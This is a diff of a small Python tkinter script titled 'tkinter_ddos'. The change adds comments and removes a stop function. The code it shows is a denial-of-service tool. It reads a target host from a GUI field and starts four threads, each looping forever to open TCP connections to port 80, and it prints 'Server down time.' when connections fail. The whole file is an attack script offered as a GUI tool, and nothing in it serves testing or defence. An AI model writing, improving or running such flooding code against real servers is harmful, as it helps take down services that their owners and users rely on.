@@ -1,6 +1,7 @@
 import socket
 from threading import Thread
 from tkinter import *
+#host and port input
 def form():
     host = input_host.get()
     global target
@@ -8,6 +9,7 @@ def form():
     global port
     port = 80
     #print(target, port)
+#main funtion that does all the magic
 def ddos():
     while True:
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as mysocket:
@@ -21,14 +23,12 @@ def ddos():
             except socket.error:
                 print("Server down time.")
         mysocket.close()
+#thread thing
 def start():
     for i in range(4):
         t = Thread(target=ddos)
         t.start()
-def stop():
-    for i in range(4):
-        t = Thread(target=ddos)
-        break
+#mainloop for the gui
 window = Tk()
 window.title("tkinter_ddos")
 window.minsize(width=400, height=300)
